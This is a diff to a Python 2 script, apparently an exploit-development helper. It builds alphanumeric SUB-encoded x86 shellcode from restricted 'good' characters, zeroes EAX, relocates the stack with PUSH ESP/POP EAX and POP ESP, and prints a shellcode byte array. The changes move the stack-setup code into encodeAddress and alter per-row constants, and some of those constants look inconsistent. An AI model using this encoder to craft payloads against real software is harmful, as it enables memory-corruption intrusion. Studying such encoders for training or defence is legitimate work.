@@ -79,53 +79,53 @@ def encodeNullSecond(x):
     a3 = a[4:6]
     a4 = a[6:8]
 
-    row1 = int("100",16)
+    row1 = int(a1,16)
     while row1 !=0:
         try:
             b1 = choice(goodChar)
             c1 = choice(goodChar)
             d1 = choice(goodChar)
 
-            if (int("100",16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
+            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                 break
 
         except:
             print "Something went wrong for row1"
 
     row2 = int(a2,16)
-    while row2 !=1:
+    while row2 !=0:
         try:
             b2 = choice(goodChar)
             c2 = choice(goodChar)
             d2 = choice(goodChar)
 
-            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 1):
+            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                 break
 
         except:
             print "Something went wrong for row2"
 
-    row3 = int(a3,16)
+    row3 = int("100",16)
     while row3 !=0:
         try:
             b3 = choice(goodChar)
             c3 = choice(goodChar)
             d3 = choice(goodChar)
 
-            if (int(a3,16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
+            if (int("100",16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                 break
 
         except:
             print "Something went wrong for row3"
 
     row4 = int(a4,16)
-    while row4 !=0:
+    while row4 !=1:
         try:
             b4 = choice(goodChar)
             c4 = choice(goodChar)
             d4 = choice(goodChar)
 
-            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 0):
+            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                 break
 
         except:
@@ -428,11 +428,12 @@ def encodeAddress(x,y):
             print "Something went wrong for row4"
 
     zeroEax()
+    print "\"\\x54\\x58\"\n" #PUSH ESP  POP EAX
     print "\"\\x2d" + padAndStrip(b4) + padAndStrip(b3) + padAndStrip(b2) + padAndStrip(b1) + "\""
     print "\"\\x2d" + padAndStrip(c4) + padAndStrip(c3) + padAndStrip(c2) + padAndStrip(c1) + "\""
     print "\"\\x2d" + padAndStrip(d4) + padAndStrip(d3) + padAndStrip(d2) + padAndStrip(d1) + "\""
     print "\"\\x50\"" #PUSH EAX
-
+    print "\"\\x5c\"" # POP ESP
 
 def padAndStrip(byte):
     address = str.format('\\x{:02x}', int(byte,16))
@@ -453,11 +454,7 @@ def zeroEax():
 def genShellcode():
     print "shellcode = ("
     #Set up location of where the shellcode will be decoded:
-    zeroEax()
-    print "\"\\x54\\x58\"\n"     #PUSH ESP  POP EAX
     encodeAddress(addy1,addy2)
-    print "\"\\x50\""            #PUSH EAX
-    print "\"\\x5c\""            #POP ESP
     #Begin actual shellcode encoding:
     encodeNorm(set1)
     encodeNorm(set2)
